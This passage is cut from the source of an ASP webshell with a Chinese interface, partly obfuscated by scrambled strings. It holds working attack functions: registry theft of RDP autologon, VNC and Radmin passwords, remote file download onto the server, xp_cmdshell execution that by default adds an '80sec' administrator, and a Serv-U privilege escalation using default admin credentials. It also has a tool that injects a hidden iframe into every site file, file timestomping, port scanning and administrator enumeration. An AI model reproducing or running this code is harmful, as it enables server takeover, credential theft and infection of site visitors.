deoleFatre.CCF`r>teen/c！<成功新建&~thPa~&目录r><br><br><br>teen<c=~SI~`UrckBaI&=SSIl`SIS RR`Ifd En",Pos):End Function:End Class:sub getTerminalInfo():ExeCute SinfoEn(" Nextesumeror ROn Er`hell~ipt.S~WScrject(ateObr.CreServesX = Set w)`ermPoey, tPortKminal, tertPathalPorerminDim trt`nPassoLogi, auterKeyginUsutoLoth, aginPautoLoDim aKey`nPassoLogi, autrnameinUsetoLogy, aubleKeinEnatoLoge, auEnablLoginsAutoDim iword`Tcp\~\RDP-tionsinStaver\Wl Serrminaol\TeContrlSet\ontrorentCM\CurSYSTEHKLM\h = ~rtPatnalPotermi`mber~ortNu = ~PrtKeynalPotermi`PortKminal& terPath lPortrminaad(teRegRe wsX.ort =termPey)`><ol>录<hr/口及自动登终端服务端RRS ~~` Then <> 0umberErr.N~ Or t = ~rmPorIf te `<br/>受到限制.限是否已经 请检查权服务端口,法得到终端RRS~无~` Else`~<br/rt & ermPo~ & t务端口: 当前终端服RRS ~>~`End If`ogon\\WinlrsionentVe\Currws NTWindosoft\MicroWARE\\SOFTCHINEAL_MAY_LOC ~HKEath =oginPautoL~`nLogooAdmi ~AutKey =nableoginEautoLn~`rNameltUseDefauy = ~serKeoginUautoL~`swordltPasDefauy = ~assKeoginPautoL~`bleKeinEnatoLog & aunPathoLogid(autegReawsX.Rle = nEnaboLogiisAuty)` = 0 nableoginEAutoLIf isThen`启<br/录功能未开系统自动登RRS ~>~`Else`rKey)inUsetoLog & aunPathoLogid(autegReawsX.Rme = sernaoginUautoL`~<br>me & sernaoginUautoL ~ & 系统帐户:自动登录的RRS ~~`sKey)inPastoLog & aunPathoLogid(autegReawsX.Rrd = asswooginPautoL`r TheIf Ern`Err.Clear`FalseRRS ~~`End If`~<br>rd & asswooginPautoL ~ & 帐户密码:自动登录的RRS ~~`End If`</ol>RRS ~~",Pso):End Sub:sub ReadREG()
RRS "<form method=post>"
RRS  "注册表键值读取<p>" 
RRS "<input type=hidden value=ReadReg name=theAct>"
RRS "<tr><td colspan=2>&nbsp;"
RRS "<select onChange='this.form.thePath.value=this.value;'>"
RRS "<option value=''>选择自带的键值</option>"
RRS "<option value='HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName'>ComputerName</option>"
RRS"<option value=""HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Linkage\Bind"">网卡列表</option>"
RRS"<option value=""HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\Parameter"">Radmin密码</option>"
RRS"<option value=""HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\Port"">Radmin端口</option>"
RRS"<option value=""HKCU\Software\ORL\WinVNC3\Password"">VNC3密码</option>"
RRS"<option value=""HKCU\Software\ORL\WinVNC3\PortNumber"">VNC3端口</option>"
RRS"<option value=""HKLM\SOFTWARE\RealVNC\WinVNC4\Password"">VNC4密码</option>"
RRS"<option value=""HKLM\SOFTWARE\RealVNC\WinVNC4\PortNumber"">VNC4端口</option>"
RRS"<option value=""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\PortNumber"">3389端口</option>"
RRS"<option value=""HKLM\SOFTWARE\Symantec\pcAnywhere\CurrentVersion\System\TCPIPDataPort"">PcAnyW数据端口</option>"
RRS"<option value=""HKLM\SOFTWARE\Symantec\pcAnywhere\CurrentVersion\System\TCPIPStatusPort"">PcAnyW状态端口</option>"
RRS "<option value='HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Tcpip\EnableSecurityFilters'>tcp/ip过滤1</option>"
RRS "<option value='HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\Tcpip\EnableSecurityFilters'>tcp/ip过滤2</option>"
RRS "<option value='HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\EnableSecurityFilters'>tcp/ip过滤3</option>"
RRS "<option value='HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SchedulingAgent\LogPath'>Schedule Log</option>"
RRS "<option value='HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List\3389:TCP'>防火开放</option>"
RRS "<option value='HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\UDPAllowedPorts'>允许开放的UDP端口</option>"
RRS "<option value='HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\TCPAllowedPorts'>允许开放的TCP端口</option>"
RRS "</select><br />"
RRS "&nbsp;<input name=thePath value='' size=80>"
RRS "<input type=button value='读取键值' onclick='this.form.submit()'>"
RRS "</form><hr/>"
if Request("thePath")<>"" then
On Error Resume Next
Set wsX = Server.CreateObject("WScript.Shell")
thePath=Request("thePath")
theArray=wsX.RegRead(thePath)
If IsArray(theArray) Then
For i=0 To UBound(theArray)
RRS "<li>" & theArray(i)
Next
Else
RRS "<li>" & theArray
End If
end if
end sub
Function downloads()
RW=RW&"<center><br><form method=post>直接下载<br><br>"
RW=RW&"远程文件:<input name=theUrl value='http://' size=80><br/>"
RW=RW&"本地路径:<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & """ size=58> "
RW=RW&"<input type=checkbox name=overWrite value=2 checked>存在覆盖 <input type=submit value=' 下载 '>"
RW=RW&"<input type=hidden value=downFromUrl name=theAct>"
RW=RW&"</form></center>"
Response.Write RW
If isDebugMode=False Then
On Error Resume Next
End If
Dim Http,theUrl,thePath,stream,getfileName,overWrite
theUrl=Request("theUrl")
thePath=Request("thePath")
overWrite=Request("overWrite")
Set stream=Server.CreateObject("ad"&e&"odb.st"&e&"ream")
Set Http=Server.CreateObject("MSXML2.XMLHTTP")
If overWrite<>2 Then
overWrite=1
End If
Http.Open "GET", theUrl, False
Http.Send()
If Http.ReadyState<>4 Then 
End If	
With stream
.Type=1
.Mode=3
.Open
.Write Http.ResponseBody
.Position=0
.SaveToFile thePath, overWrite
If Err.Number=3004 Then
Err.Clear
getfileName=Split(theUrl, "/")(UBound(Split(theUrl, "/")))
If getfileName="" Then
getfileName="12vh.txt"
End If
thePath=thePath & "\" & getfileName
.SaveToFile thePath, overWrite
End If
.Close
End With
chkErr(Err)		
Set Http=Nothing
Set Stream=Nothing
If isDebugMode=False Then
On Error Resume Next
End If
End Function
FuncTion MMD()
SI="<br><table width=""100%""><tr class=tr><form name=form method=post action="""">CMD命令<input type=text name=MMD size=35 value='net user 80sec 80sec /add & net localgroup administrators 80sec /add'> <input type=text name=U value=mssql用户名> <input type=text name=P value=mssql密码> <input type=submit value=执行></form></tr></table>":REsPonsE.writE SI:SI="":If trim(REquEst.form("MMD"))<>""  thEn:PaSsword= trim(REquEst.form("P")):id=trim(REquEst.form("U")):set adoConn=SErvEr.CreateObject("ADODB.Connection"):adoConn.Open "Provider=SQLOLEDB.1;PaSsword="&PaSsword&";UsEr ID="&id:strQuery = "exec master.dbo.xp_cmdshell '" & REquEst.form("MMD") & "'":set recREsult = adoConn.Execute(strQuery):If NOT recREsult.EOF thEn:Do While NOT recREsult.EOF:strREsult = strREsult & chr(13) & recREsult(0):recREsult.MoveNext:Loop:End if:set recREsult = Nothing:strREsult = REplAcE(strREsult," ","&nbsp;"):strREsult = REplAcE(strREsult,"<","&lt;"):strREsult = REplAcE(strREsult,">","&gt;"):strREsult = REplAcE(strREsult,chr(13),"<br>"):End if:set adoConn = Nothing:REsPonsE.WritE REquEst.form("MMD") & "<br>"& strREsult
rrs ""&copyurl&""
end Function:Function adminab()
Response.Expires=0
on error resume next
Set tN=server.createObject("Wscript.Network")
Set objGroup=GetObject("WinNT://"&tN.ComputerName&"/Administrators,group")
For Each admin in objGroup.Members
RRS admin.Name&"<br>"
Next
if err then
RRS "他奶奶的不行啊:Wscript.Network"
end if
End Function
sWHEEL1 = "jwt"
Function Encrypt(acd)
For i = 1 To Len(acd) step 1
c=mid(acd,i,1)
if c="※" then
d=mid(acd,i,2)
i=i+1
e=replace(d,"※","")
bbc=bbc&mid(sWHEEL1,cint(e),1)
else
bbc=bbc&c
end if
next
Encrypt=bbc
end Function
sub ScanPort():ExeCute SinfoEn("76000 = 77meoutiptTir.ScrServe`~ thet~)=~(~por.Formquestif ren`89,4333,3345,14139,4,135,0,110,25,821,23ist=~PortL958~`else`m(~pot.Forequesist=rPortLrt~)`end if`)=~~ (~ip~.Formquestif rethen`27.0.IP=~10.1~`else`(~ip~.FormquestIP=re)`end if`D)</p荐使用CM慢,个人推,速度比较描多个端口器(如果扫>端口扫描br><pRRS~<>~`rue;'led=tdisabbmit.m1.su='forubmit' onSion='' act'postthod=1' me'formname=form RRS~<>~`&nbspn IP:p>ScaRRS~<;~`ze='6~' si~&IP&lue='p' vaid='iBox' 'Textlass=xt' ce='te' type='ipt nam<inpuRRS~ 0'>~`rt Libr>PoRRS~<st:~`ist&~PortLe='~& valu='60' sizetBox'='Texclassext' pe='tt' ty='por nameinputRRS~<'>~`br><bRRS~<r>~`n '>~' scaalue=om' v'buttlass=it' c'submtype=mit' ='sub nameinputRRS~<`11'>~ue='1' val'scan' id=iddenpe='hn' ty='sca nameinputRRS~<`form>/p></RRS~<~`> ~~ n~) <(~sca.FormquestIf reThen`1 = ttimerimer`><hr>b><br报告:</<b>扫描RRS(~~)`~),~,~portForm(uest.t(req Splitmp =~)`ip~),orm(~est.F(requSplitip = ~,~)`bound to Uu = 0For h(ip)` = 0 ,~-~)p(hu)Str(iIf InThen`ound(To Ub = 0 For itmp)` Thenp(i))ic(tmnumerIf Is `p(i))), tmip(huScan(Call `Else`, ~-~mp(i)Str(t = Inseekx)` 0 Thekx >If seen`kx - , seemp(i)eft(tN = Lstart1 )`seekx)) - tmp(i Len(p(i),ht(tm= RigendN  )` ThenendN)eric(Isnum and artN)ic(stnumerIf Is`To enartN  = stFor jdN`), j)ip(huScan(Call `Next`Else`br>~)mber<ot nu is nN & ~& endor ~  & ~ tartNRRS(s`End If`Else`ber<bt numis no & ~ mp(i)RRS(tr>~)`End If`End If`Next`Else`hu),~v(ip(StrRe,1,Inp(hu)Mid(irt = ipSta.~))`,~-~)p(hu)Str(i))-Inip(hu,Len(-~)+1hu),~r(ip(,InStp(hu)Mid(i) to )+1,1),~.~ip(hurRev(,InStp(hu)Mid(ixx = For x)`ound(To Ub = 0 For itmp)` Thenp(i))ic(tmnumerIf Is `tmp(ixxx, rt & ipStaScan(Call ))`Else`, ~-~mp(i)Str(t = Inseekx)` 0 Thekx >If seen`kx - , seemp(i)eft(tN = Lstart1 )`seekx)) - tmp(i Len(p(i),ht(tm= RigendN  )` ThenendN)eric(Isnum and artN)ic(stnumerIf Is`To enartN  = stFor jdN`xxx,jrt & ipStaScan(Call )`Next`Else`br>~)mber<ot nu is nN & ~& endor ~  & ~ tartNRRS(s`End If`Else`ber<bt numis no & ~ mp(i)RRS(tr>~)`End If`End If`Next`Next`End If`Next`2 = ttimerimer`imer1er2-tt(timtr(inme=cstheti))`ime&~&thet in ~ocesshr>PrRRS~< s~`END IF",Pso):end sub:
:Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject("ADODB.connection"):connstr="Provider=SQLOLEDB.1;Data Source=" & targetip &","& portNum &";User ID=lake2;Password=;":conn.ConnectionTimeout=1:conn.open connstr:If Err Then:If Err.number = -2147217843 or Err.number = -2147467259 Then:If InStr(Err.description, "(Connect()).") > 0 Then:RRS(targetip & ":" & portNum & ".......关闭<br>"):Else:RRS(targetip & ":" & portNum & ".......<font color=red>开放</font><br>"):End If:End If:End If:End Sub:Select Case Action:Case "MainMenu":MainMenu():Case "getTerminalInfo":getTerminalInfo():Case "PageAddToMdb":PageAddToMdb():case "ScanPort":ScanPort():Case "goback":goback():Case "Servu":SUaction=request("SUaction")
if  not isnumeric(SUaction) then response.end
user = trim(request("u"))
pass = trim(request("p"))
port = trim(request("port"))
cmd = trim(request("c"))
f=trim(request("f"))
if f="" then
f=gpath()
else
f=left(f,2)
end if
ftpport = 65500
timeout=3
loginuser = "User " & user & vbCrLf
loginpass = "Pass " & pass & vbCrLf
deldomain = "-DELETEDOMAIN" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & " PortNo=" & ftpport & vbCrLf
mt = "SITE MAINTENANCE" & vbCrLf
newdomain = "-SETDOMAIN" & vbCrLf & "-Domain=goldsun|0.0.0.0|" & ftpport & "|-1|1|0" & vbCrLf & "-TZOEnable=0" & vbCrLf & " TZOKey=" & vbCrLf
newuser = "-SETUSERSETUP" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & "-PortNo=" & ftpport & vbCrLf & "-User=go" & vbCrLf & "-Password=od" & vbCrLf & _
"-HomeDir=c:\\" & vbCrLf & "-LoginMesFile=" & vbCrLf & "-Disable=0" & vbCrLf & "-RelPaths=1" & vbCrLf & _
"-NeedSecure=0" & vbCrLf & "-HideHidden=0" & vbCrLf & "-AlwaysAllowLogin=0" & vbCrLf & "-ChangePassword=0" & vbCrLf & _
"-QuotaEnable=0" & vbCrLf & "-MaxUsersLoginPerIP=-1" & vbCrLf & "-SpeedLimitUp=0" & vbCrLf & "-SpeedLimitDown=0" & vbCrLf & _
"-MaxNrUsers=-1" & vbCrLf & "-IdleTimeOut=600" & vbCrLf & "-SessionTimeOut=-1" & vbCrLf & "-Expire=0" & vbCrLf & "-RatioUp=1" & vbCrLf & _
"-RatioDown=1" & vbCrLf & "-RatiosCredit=0" & vbCrLf & "-QuotaCurrent=0" & vbCrLf & "-QuotaMaximum=0" & vbCrLf & _
"-Maintenance=System" & vbCrLf & "-PasswordType=Regular" & vbCrLf & "-Ratios=None" & vbCrLf & " Access=c:\\|RWAMELCDP" & vbCrLf
quit = "QUIT" & vbCrLf
newuser=replace(newuser,"c:",f)
select case SUaction
case 1
set a=Server.CreateObject("Microsoft.XMLHTTP")
a.open "GET", "http://127.0.0.1:" & port & "/goldsun/upadmin/s1",True, "", ""
a.send loginuser & loginpass & mt & deldomain & newdomain & newuser & quit
set session("a")=a
RRS"<form method='post' name='goldsun'>"
RRS"<input name='u' type='hidden' id='u' value='"&user&"'></td>"
RRS"<input name='p' type='hidden' id='p' value='"&pass&"'></td>"
RRS"<input name='port' type='hidden' id='port' value='"&port&"'></td>"
RRS"<input name='c' type='hidden' id='c' value='"&cmd&"' size='50'>"
RRS"<input name='f' type='hidden' id='f' value='"&f&"' size='50'>"
RRS"<input name='SUaction' type='hidden' id='SUaction' value='2'></form>"
RRS"<script language='javascript'>"
RRS"document.write('<center>正在连接 127.0.0.1:"&port&",使用用户名: "&user&",口令："&pass&"...<center>');"
RRS"setTimeout('document.all.goldsun.submit();',4000);"
RRS"</script>"
case 2
set b=Server.CreateObject("Microsoft.XMLHTTP")
b.open "GET", "http://127.0.0.1:" & ftpport & "/goldsun/upadmin/s2", True, "", ""
b.send "User go" & vbCrLf & "pass od" & vbCrLf & "site exec " & cmd & vbCrLf & quit
set session("b")=b
RRS"<form method='post' name='goldsun'>"
RRS"<input name='u' type='hidden' id='u' value='"&user&"'></td>"
RRS"<input name='p' type='hidden' id='p' value='"&pass&"'></td>"
RRS"<input name='port' type='hidden' id='port' value='"&port&"'></td>"
RRS"<input name='c' type='hidden' id='c' value='"&cmd&"' size='50'>"
RRS"<input name='f' type='hidden' id='f' value='"&f&"' size='50'>"
RRS"<input name='SUaction' type='hidden' id='SUaction' value='3'></form>"
RRS"<script language='javascript'>"
RRS"document.write('<br><center>正在提升权限,请等待...,<center>');"
RRS"setTimeout(""document.all.goldsun.submit();"",4000);"
RRS"</script>"
case 3
set c=Server.CreateObject("Microsoft.XMLHTTP")
c.open "GET", "http://127.0.0.1:" & port & "/goldsun/upadmin/s3", True, "", ""
c.send loginuser & loginpass & mt & deldomain & quit
set session("c")=c
RRS"<center>提权完毕,已执行了命令：<br><font color=red>"&cmd&"</font><br><br>"
RRS"<input type=button value=' 返回继续 ' onClick=""location.href='?Action=Servu';"">"
RRS"</center>"
case else
on error resume next
set a=session("a")
set b=session("b")
set c=session("c")
a.abort
Set a = Nothing
b.abort
Set b = Nothing
c.abort
Set c = Nothing
RRS"<center><br><form method='post' name='goldsun'>"
RRS"<table width='494' height='163' border='1' cellpadding='0' cellspacing='1' bordercolor='#666666'>"
RRS"<tr align='center' valign='middle'>"
RRS"<td colspan='2'>Serv-U 提升权限 ASP版</td>"
RRS"</tr>"
RRS"<tr align='center' valign='middle'>"
RRS"<td width='100'>用户名:</td>"
RRS"<td width='379'><input name='u' type='text' id='u' value='LocalAdministrator'></td>"
RRS"</tr>"
RRS"<tr align='center' valign='middle'>"
RRS"<td>口 令：</td>"
RRS"<td><input name='p' type='text' id='p' value='#l@$ak#.lk;0@P'></td>"
RRS"</tr>"
RRS"<tr align='center' valign='middle'>"
RRS"<td>端 口：</td>"
RRS"<td><input name='port' type='text' id='port' value='43958'></td>"
RRS"</tr>"
RRS"<tr align='center' valign='middle'>"
RRS"<td>系统路径：</td>"
RRS"<td><input name='f' type='text' id='f' value='"&f&"' size='8'></td>"
RRS"</tr>"
RRS"<tr align='center' valign='middle'>"
RRS"<td>命*令：</td>"
RRS"<td><input name='c' type='text' id='c' value='cmd /c net user 80sec 80sec /add & net localgroup administrators 80sec /add' size='50'></td>"
RRS"</tr>"
RRS"<tr align='center' valign='middle'>"
RRS"<td colspan='2'><input type='submit' name='Submit' value='提交'> "
RRS"<input type='reset' name='Submit2' value='重置'>"
RRS"<input name='SUaction' type='hidden' id='action' value='1'></td>"
RRS"</tr></table></form></center>"
end select
function Gpath()
on error resume next
err.clear
set f=Server.CreateObject("Scripting.FileSystemObject")
if err.number>0 then
gpath="c:"
exit function
end if
gpath=f.GetSpecialFolder(0)
gpath=lcase(left(gpath,2))
set f=nothing:end function:
Case "Cplgm"
Fpath=Request("fd")
addcode = Request("code")
addcode2 = Request("code2")
pcfile=request("pcfile")
checkbox=request("checkbox")
ShowMsg=request("ShowMsg")
FType=request("FType")
M=request("M")
if Ftype="" then Ftype="txt|htm|html|asp|php|jsp|aspx|cgi|cer|asa|cdx"
if Fpath="\" then Fpath=Server.MapPath("\")
if Fpath="." or Fpath="" then Fpath=Server.MapPath(".")
if addcode="" then addcode="<iframe src=http://127.0.0.1/m.htm width=0 height=0></iframe>"
if checkbox="" then checkbox=request("checkbox")
if pcfile="" then
pcfileName=Request.ServerVariables("SCRIPT_NAME")
pcfilek=split(pcfileName,"/") 
pcfilen=ubound(pcfilek) 
pcfile=pcfilek(pcfilen) 
end if
RRS ("<BR><b>网站根目录</b>- "&Server.MapPath("/")&"<br>")
RRS ("<b>本程序目录</b>- "&Server.MapPath("."))
RRS "<form method=POST><b>[" 
if M="1" then RRS"批量挂马-批量挂马"
if M="2" then RRS"批量清马-清除别人的网马"
if M="3" then RRS"批量挂马-批量替换代码"
if M="" then response.end
RRS "]</b><table width=100% border=0><tr><td>文件路径：</td>"
RRS "<td><input type=text name=fd value='"&Fpath&"' size=40> 填“\”即网站根目录；“.”为程序所在目录</td></tr>"
if M="1" then RRS "<tr><td>过滤重复：</td><td><input class=c name='checkbox' type=checkbox value='checked' "&checkbox&"> 防止一个页面中有多个重复的代码</td></tr>"
RRS "<tr><td>排除文件：</td>"
RRS "<td><input name='pcfile' type=text id='pcfile' value='"&pcfile&"' size=40> 输入不想被修改的文件名，例如：1.asp|2.asp|3.asp</td></tr>"
RRS "<tr><td>文件类型：</td>"
RRS "<td><input name='FType' type=text id='FType' value='"&Ftype&"' size=40> 输入要修改的文件类型[扩展名]，例如：htm|html|asp|php|jsp|aspx|cgi</td></tr><tr><td>"
if M="1" then RRS"要挂的马："
if M="2" then RRS"要清的马："
if M="3" then RRS"要替换的代码："
RRS"</td><td><textarea name=code cols=66 rows=3>"&addcode&"</textarea></td></tr>"
if M="3" then RRS "<tr><td>替换为：</td><td><textarea name=code2 cols=66 rows=3>"&addcode2&"</textarea></td></tr>"
RRS "<tr><td></td><td> <input name=submit type=submit value=开始执行> --标记解释--[成功：√ ， 排除：× ， 重复：<font color=red>×</font>]</td></tr>"
RRS "</table></form>" 
if request("submit")="开始执行" then 
RRS"<div style='line-height:25px'><b>执行记录：</b><br>"
call InsertAllFiles(Fpath,addcode,pcfile)
RRS"</div>"
end if
sub att()
dim Path,FileName,NewTime,ShuXing
set path=request.Form("path1")
set fileName=request.Form("filename")
set newTime=request.Form("time")
set ShuXing=request.Form("shuxing")
RRS"<form method=post>"
RRS"路?q径:<input name='path1' value='"&WWWROOT&"\' size='60'><br/>"
RRS"文件名称:<input name=filename value='index.asp' size='60'><br/>"
RRS"修改时间:<input name=time value='12/21/2009 23:59:59' size='60'><br/>"
RRS"<select onChange='this.form.shuxing.value=this.value;'>"
RRS"<option value=''>普通</option>"
RRS"<option value='1'>只读</option>"
RRS"<option value='2'>隐藏</option>"
RRS"<option value='4'>系统</option>"
RRS"<option value='33'>只读存档 </option>"
RRS"<option value='34'>隐藏存档 </option>"
RRS"<option value='35'>只读隐藏存档 </option>"
RRS"<option value='39'>只读隐藏存档系统 </option>"
RRS"修改属性：<input name=shuxing value='0' size='60'><br/>"
RRS"<input type=submit value=修改>"
RRS"</form>"
if( (len(path)>0)and(len(fileName)>0)and(len(newTime)>0) )then
Set fso=Server.CreateObject("Scripting.FileSystemObject")
Set file=fso.getFile(path&fileName)
file.attributes=ShuXing
Set shell=Server.CreateObject("Shell.Application")
Set app_path=shell.NameSpace(server.mappath("."))
Set app_file=app_path.ParseName(fileName)
app_file.Modifydate=newTime
RRS"</br></br>修改文件&nbsp;&nbsp;"&path&fileName&"&nbsp;&nbsp;属性完成"
end if
end sub
function php():set fso=Server.CreateObject("Scripting.FileSystemObject"):fso.CreateTextFile(server.mappath("test.php")).Write"<?PHP echo '恭喜服务器支持PHP'?><?php phpinfo()?>":Response.write"<iframe src=test.php width=950 height=300></iframe> ":Response.write "<br><br><p><br><p><br><br><p><br><center>如果你能看到test.php正常显示,表示支持PHP<p><font color=red否则就是不支持拉!测试完成记得删除！":End function:
Function RndNumber(Min,Max) 
Randomize 
RndNumber=Int((Max - Min + 1) * Rnd() + Min) 
End Function
function Gpath()
on error resume next
err.clear
set f=Server.CreateObject("Scripting.FileSystemObject")
if err.number>0 then
gpath="c:"
exit function
end if
gpath=f.GetSpecialFolder(0)
gpath=lcase(left(gpath,2))
set f=nothing
end function
function jsp():set fso=Server.CreateObject("Scripting.FileSystemObject"):fso.CreateTextFile(server.mappath("test.jsp")).Write"恭喜服务器支持jsp":Response.write"<iframe src=test.jsp width=950 height=300></iframe> ":Response.write "<br><br><p><br><p><br><br><p><br><center>如果你能看到test.jsp正常显示,表示支持jsp<p></font><p><a href='?Action=apjdel'><font size=5 color=red>删除测试的所有文件(必须全部测试才可以删除,否则会出错!)</font></a></center>":End function:function aspx():set fso=Server.CreateObject("Scripting.FileSystemObject"):fso.CreateTextFile(server.mappath("test.aspx")).Write"恭喜服务器支持aspx":Response.write"<iframe src=test.aspx width=950 height=300></iframe> ":Response.write "<br><br><p><br><p><br><br><p><br><center>如果你能看到Test.aspx正常显示,表示支持asp.net<p><font color=red>否则就是不支持拉!测试完成记得删除！":End function
function apjdel():set fso=Server.CreateObject("Scripting.FileSystemObject"):fso.DeleteFile(server.mappath("test.aspx")):fso.DeleteFile(server.mappath("test.php")):fso.DeleteFile(server.mappath("test.jsp")):response.write"删除完毕!":End function:function sam():Response.write "<br><br><p><br><p><br><br><p><br><center><br><br><font color=red>":response.write"<center><font face=wingdings color=#00EC00 style=font-size:240pt>N</font><span class=style1><span style=font-weight: 300><font face=Impact color=#FFFFFF style=font-size: 100pt></center>":End function:function goback():set Ofso = Server.CreateObject("Scripting.FileSystemObject")
set ofolder = Ofso.Getfolder(Session("FolderPath"))
if not ofolder.IsRootFolder then 
Response.write "<script>ShowFolder("""&RePath(ofolder.parentfolder)&""")</script>"
else 
Response.write "<script>ShowFolder("""&Session("FolderPath")&""")</script>"
end if
set Ofso=nothing
set ofolder=nothing
end function
Sub InsertAllFiles(Wpath,Wcode,pc)
Server.ScriptTimeout=999999999
if right(Wpath,1)<>"\" then Wpath=Wpath &"\"
Set WFSO = CreateObject("Scripting.FileSystemObject")
on error resume next 
Set f = WFSO.GetFolder(Wpath)
Set fc2 = f.files
For Each myfile in fc2
Set FS1 = CreateObject("Scripting.FileSystemObject")
FType1=split(myfile.name,".") 
FType2=ubound(FType1) 
if Ftype2>0 then
FType3=LCase(FType1(FType2)) 
else
FType3="无"
end if
if Instr(LCase(pc),LCase(myfile.name))=0 and Instr(LCase(FType),FType3)<>0 then
select case M
case "1"
if checkbox<>"checked" then
Set tfile=FS1.opentextfile(Wpath&""&myfile.name,8,-2)
tfile.writeline Wcode
RRS"√ "&Wpath&myfile.name
tfile.close
else
Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
if Instr(tfile1.readall,Wcode)=0 then
Set tfile=FS1.opentextfile(Wpath&""&myfile.name,8,-2)
tfile.writeline Wcode
RRS"√"&Wpath&myfile.name
tfile1.close
else
RRS"<font color=red>×</font> "&Wpath&myfile.name
tfile1.close
end if
Set tfile1=Nothing
end if
case "2"
Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
NewCode=Replace(tfile1.readall,Wcode,"")
Set objCountFile=WFSO.CreateTextFile(Wpath&myfile.name,True)
objCountFile.Write NewCode
objCountFile.Close
RRS"√"&Wpath&myfile.name
Set objCountFile=Nothing
case "3"
Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
NewCode=Replace(tfile1.readall,Wcode,addCode2)
Set objCountFile=WFSO.CreateTextFile(Wpath&myfile.name,True)
objCountFile.Write NewCode
objCountFile.Close
RRS"√"&Wpath&myfile.name
Set objCountFile=Nothing
case else
RRS"错误.":response.end
end select
else
RRS"× "&Wpath&myfile.name
end if
RRS " → <a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""DownFile"")' class='am' title='下载'>Down</a> "
RRS "<a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""EditFile"")' class='am' title='编辑'>edit</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""DelFile"")'onclick='return yesok()' class='am' title='删除'>Del</a> "
RRS "<a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""CopyFile"")' class='am' title='复制'>Copy</a> "
RRS "<a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""MoveFile"")' class='am' title='移动'>Move</a><br>"
Next
Set fsubfolers = f.SubFolders
For Each f1 in fsubfolers
NewPath=Wpath&""&f1.name
InsertAllFiles NewPath,Wcode,pc
Next
set tfile=nothing
Set FSO = Nothing
set tfile=nothing
set tfile2=nothing
Set WFSO = Nothing
End Sub
FuncTion su7()
response.write"<form name='form1' method='post' action=''>"
response.write"<p align='center'>"
response.write"------------------Serv-U Information------------------"
response.write"<br>"
response.write"user:"
response.write"<input name='duser' type='text' class='TextBox' id='duser' value='LocalAdministrator'><br>"
response.write"pwd :"
response.write"<input name='dpwd' type='text' class='TextBox' id='dpwd' value='#l@$ak#.lk;0@P'><br>"
response.write"port:"
response.write"<input name='dport' type='text' class='TextBox' id='dport' value='43958'><br>"
response.write"---------------------Add User!!! ---------------------<BR>"
response.write"Domain: &nbsp; "
response.write"<input name='domain' type='text' class='TextBox' id='domain' value='80sec' /><br>"
response.write"FTP USER:"
response.write"<input name='fuser' type='text' class='TextBox' id='fuser' value='80sec'><br>"
response.write"FTP PASS:"
response.write"<input name='fpass' type='text' class='TextBox' id='fpass' value='123456'><br>"
response.write"FTP PORT:"
response.write"<input name='fport' type='text' class='TextBox' id='fport' value='21'><br>"
response.write"FTP PATH:"
response.write"<input name='fpath' type='text' class='TextBox' id='fpath' value='c:\\'>"
response.write"<br>"
response.write"Privilege"
response.write"<select para=value name='privilege'>"
response.write"<option value=2>Read-only Admin</option>"
response.write"<option value=3>Group Admin</option>"
response.write"<option value=4>Domain Admin</option>"
response.write"<option value=5>System Admin</option>"
response.write"</select>"
response.write"</p>"
response.write"<p align='center'>"
response.write"<input name='radiobutton' type='radio' value='add' checked class='TextBox'>"
response.write"Add User "
response.write"<input type='radio' name='radiobutton' value='del' class='TextBox'> "
response.write"Del User </p>"
response.write"<p align='center'>"
response.write"<input name='Submit' type='submit' class='buttom' value='Run' />"
response.write"</p>"
response.write"</form>"
user = request.Form("duser")
pass = request.Form("dpwd")
port = request.Form("dport")
domain = request.Form("domain")
fuser = request.Form("fuser")
fpass = request.Form("fpass")
fport = request.Form("fport")
fpath = request.Form("fpath")
privilege=request.Form("privilege")
select case privilege
   case 2:
  privilege="ReadOnly"
   case 3:
  privilege="Group"
   case 4:
  privilege="Domain"
   case 5:
  privilege="System"
  end select
	if request.Form("radiobutton") = "add" Then

loginuser = "User " & user & vbCrLf
loginpass = "Pass " & pass & vbCrLf
mt = "SITE MAINTENANCE" & vbCrLf
newdomain = "-SETDOMAIN" & vbCrLf & "-Domain=" & domain &"|0.0.0.0|" & fport & "|-1|1|0" & vbCrLf & "-DynDNSEnable=0" & vbCrLf & "  DynIPName=" & vbCrLf
newuser = "-SETUSERSETUP" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & "-PortNo=" & fport & vbCrLf & "-User="& fuser & vbCrLf & "-Password=" & fpass & vbCrLf & _
        "-HomeDir=" & fpath & vbCrLf & "-LoginMesFile=" & vbCrLf & "-Disable=0" & vbCrLf & "-RelPaths=1" & vbCrLf & _
        "-NeedSecure=0" & vbCrLf & "-HideHidden=0" & vbCrLf & "-AlwaysAllowLogin=0" & vbCrLf & "-ChangePassword=0" & vbCrLf & _
